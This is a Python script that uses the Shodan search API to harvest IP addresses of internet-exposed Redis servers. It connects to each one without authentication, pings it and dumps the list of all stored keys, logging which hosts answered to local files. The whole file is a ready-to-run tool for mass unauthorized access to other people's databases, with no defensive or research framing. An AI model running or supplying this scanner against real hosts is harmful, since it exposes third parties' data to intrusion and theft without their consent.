import redis
import shodan
from tqdm import tqdm


def main():
    API_KEY = get_api_key()
    hosts = get_hosts(API_KEY)
    result, success = try_hosts(hosts)
    with open('result', 'w') as f_result, open('success_result', 'w') as f_success:
        f_result.write('\n'.join(result))
        f_success.write('\n'.join(success))


def get_api_key():
    with open('API_KEY', 'r') as f:
        return f.read().strip()


def get_hosts(API_KEY):
    api = shodan.Shodan(API_KEY)
    try:
        results = api.search('redis')
        ips = [result['ip_str'] for result in results['matches']]
        print(f"Results found: {len(ips)} from {results['total']}")
        return ips
    except shodan.APIError as e:
        print('Error: {}'.format(e))


def try_hosts(hosts):
    ret_val = []
    success_ret_val = []

    for host in tqdm(hosts):
        results, flag = try_host(host)
        ret_val += results
        if flag:
            success_ret_val += results

    return ret_val, success_ret_val


def try_host(host):
    """Return (result, success_flag)"""
    ret_val = []
    r = redis.Redis(host=host, socket_timeout=20)
    ret_val.append("\n" * 2)
    ret_val.append("====" * 10)
    ret_val.append(host)

    try:
        result = r.ping()
        ret_val.append(f'PING {result}')
        if not result:
            return ret_val, False
        ret_val.append(str([k for k in r.scan_iter('*')]))
    except Exception as e:
        ret_val.append(f'{type(e).__name__}: {e}')
    else:
        return ret_val, True
    return ret_val, False


if __name__ == '__main__':
    main()
